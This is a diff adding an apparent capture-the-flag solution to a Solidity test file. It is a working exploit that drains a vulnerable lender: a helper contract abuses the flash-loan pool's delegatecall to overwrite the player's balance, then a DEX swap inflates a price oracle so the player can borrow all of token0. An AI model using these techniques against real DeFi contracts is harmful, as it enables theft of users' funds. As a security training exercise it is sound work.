@@ -68,7 +68,44 @@ contract Challenge3Test is Test {
         //    Add your hack below!    //
         //////////////////////////////*/
 
+        // IDEAS:
+        // - the Oracle has 10_000 ether of each token
+        // - we need some collateral in order to borrow
+        // - all the previous contracts are used so we can drain the DEX and flashloan
+        // - token1 has special rules in isSolvent and is multiplied by some price oracle
+        // - manipulate tokenPrice somehow so that we aren't blocked by isSolvent
+        //      - the price is determined by the DEX so might need to flashLoan that to change price
+        // - the solution requires draining only token0 
+        // - the flashloan contract only loans to other contracts so we need to use an exploit contract
+
+        // Grab all 10_000 token0 from the vulnerable flashloan contract
+        FlashloanExploit _flashloanExploit = new FlashloanExploit();
+        vm.label(address(_flashloanExploit), "FlashloanExploit");
+
+        flashLoanPool.flashLoan(
+            address(_flashloanExploit),
+            abi.encodeWithSignature(
+                "exploit(address)", player
+            )
+        );
+        flashLoanPool.withdraw(10000 ether);
+
+        // swap token0 for token1 in DEX. should give us token1 and also increase its price
+        token0.approve(address(oracleDex), 10000 ether);
+        oracleDex.swap(address(token0), address(token1), 10000 ether);
+
+        // Deposit all the tokens we got from the DEX as collateral to the Lender contract
+        token1.approve(address(target), 10000 ether);
+        target.depositToken1(token1.balanceOf(address(player)));
+
+        // Take the target's balance of token0. We can do this because the Lender contract is reading the price of token1
+        // from the DEX. The DEX now reports a very high price for token1 because we deposited a huge amount of token0
+        // relative to the existing liquidity in the pool. As a result, from the point of view of the Lender, token0 is very cheap
+        // and token1 is very valuable so it is happy to give us all of token0 since we've put down valuable collateral.
+        target.borrowToken0(token0.balanceOf(address(target)));
+
         //============================//
+
 
         vm.stopPrank();
 
@@ -80,10 +117,33 @@ contract Challenge3Test is Test {
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 ////////////////////////////////////////////////////////////*/
-
 contract Exploit {
     IERC20 token0;
     IERC20 token1;
     BorrowSystemInsecureOracle borrowSystem;
     InsecureDexLP dex;
 }
+
+contract FlashloanExploit {
+    // Copy the layout of the vulnerable contract
+    //using Address for address;
+    //using SafeERC20 for IERC20;
+
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+    /// @dev Internal balances of the pool for each user.
+    mapping(address => uint) public balances;
+
+    // flag to notice contract is on a flashloan
+    bool private _flashLoan = false;
+    InSecureumLenderPool pool;
+
+    function exploit(address player) external {
+        // Delegatecall allows us to execute functions using the calling contract's storage.
+        // Here we can change the contract's internal balance to give us a token balance
+        // just updating the entry for the player address in the contact's balance mapping.
+        balances[player] = 10000 ether;
+    }
+}
+
